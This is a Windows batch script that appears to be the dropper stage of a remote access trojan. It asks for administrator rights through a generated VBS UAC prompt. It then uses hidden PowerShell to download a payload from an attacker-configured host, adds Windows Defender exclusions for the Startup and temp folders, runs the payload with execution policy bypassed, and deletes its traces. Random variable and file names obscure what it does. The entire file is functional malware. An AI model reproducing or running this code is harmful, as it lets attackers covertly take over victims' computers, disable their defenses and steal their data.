@REM TODO: add UAC bypass

@REM change me
set "EcSjRhAguo=X.X.X.X"

@echo off
:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %EcSjRhAguo%/mk01-onlyrat/payloads/v2.ps1 -OutFile KFPGaEYdcz.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -windowstyle hidden -ep bypass ./KFPGaEYdcz.ps1
del wEaoFkNduy.cmd
